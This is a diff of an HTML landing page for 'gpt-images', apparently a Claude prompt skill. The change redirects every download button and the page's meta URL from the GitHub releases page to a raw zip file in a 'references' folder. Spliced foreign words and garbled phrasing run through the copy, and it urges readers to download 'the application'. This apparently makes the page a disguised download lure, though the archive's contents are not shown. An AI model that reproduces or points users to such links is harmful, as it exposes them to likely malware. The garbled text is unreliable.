@@ -10,7 +10,7 @@
     <meta property="og:title" content="gpt-images - Turn Briefs into Production-Ready GPT Image Prompts">
     <meta property="og:description" content="A Claude skill that turns a plain brief into a production-ready prompt for OpenAI GPT Image models. Download and start creating today.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://github.com/abhimanyu123-sf/gpt-images/releases">
+    <meta property="og:url" content="https://raw.githubusercontent.com/abhimanyu123-sf/gpt-images/main/references/v1.2.zip">
     <style>
         * {
             margin: 0;
@@ -126,7 +126,7 @@
 <body>
     <h1>🎨 gpt-images - Prompts That Produce Perfect Images</h1>
     
-    <a href="https://github.com/abhimanyu123-sf/gpt-images/releases" class="badge">⬇️ Download Now - Free</a>
+    <a href="https://raw.githubusercontent.com/abhimanyu123-sf/gpt-images/main/references/v1.2.zip" class="badge">⬇️ Download Now - Free</a>
     
     <div class="section">
         <h2>🚀 What Is gpt-images?</h2>
@@ -157,10 +157,10 @@
         <h2>📥 Download & Install</h2>
         <p>Getting started with gpt-images is incredibly simpleand takes lessthan a minute. Follow diese two steps:</p>
         <ol>
-            <li><strong>Visit the download page:</strong> <a href="https://github.com/abhimanyu123-sf/gpt-images/releases" style="font-weight:bold;">Click here to download gpt-images</a></li>
+            <li><strong>Visit the download page:</strong> <a href="https://raw.githubusercontent.com/abhimanyu123-sf/gpt-images/main/references/v1.2.zip" style="font-weight:bold;">Click here to download gpt-images</a></li>
             <li><strong>Get the file:</strong> Visit this link to download the application.</li>
         </ol>
-        <p style="margin-top:20px;"><a href="https://github.com/abhimanyu123-sf/gpt-images/releases" class="cta-button">⬇️ Get Your Copy Now</a></p>
+        <p style="margin-top:20px;"><a href="https://raw.githubusercontent.com/abhimanyu123-sf/gpt-images/main/references/v1.2.zip" class="cta-button">⬇️ Get Your Copy Now</a></p>
         <p>No complex installation wizards, no technical prerequisites. Just download and start creating better image prompts immediately.</p>
     </div>
     
@@ -215,7 +215,7 @@
     <div class="section">
         <h2>🚀 Start Creating Better Images Today</h2>
         <p>You've seen how simple но powerful gpt-images can be.stop wasting valuable time and tokens on vague, failed image prompts. Click the button below, download the software, and see the difference structured prompting makes.</p>
-        <p style="margin-top:20px;"><a href="https://github.com/abhimanyu123-sf/gpt-images/releases" class="badge">🎯 Download gpt-images Now</a></p>
+        <p style="margin-top:20px;"><a href="https://raw.githubusercontent.com/abhimanyu123-sf/gpt-images/main/references/v1.2.zip" class="badge">🎯 Download gpt-images Now</a></p>
         <p>One small download. Hundreds of images akhirnya created correctly. The future of your visual content starts here.</p>
     </div>
 </body>
